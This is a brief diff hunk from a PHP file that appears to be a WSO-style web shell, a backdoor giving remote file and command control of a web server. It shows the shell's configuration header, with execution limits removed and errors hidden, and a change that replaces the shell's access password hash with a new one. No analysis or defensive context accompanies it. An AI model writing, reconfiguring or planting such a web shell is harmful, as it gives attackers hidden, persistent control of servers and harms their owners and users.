@@ -8,7 +8,7 @@ set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$auth_pass = 'dc7474051d103638bea737952a13f8bd59c41085'; // kepongentod
+$auth_pass = '900150983cd24fb0d6963f7d28e17f72'; // kepongentod
 $color = '#00ff00';
 $default_action = 'FilesMan';
 $default_use_ajax = true;
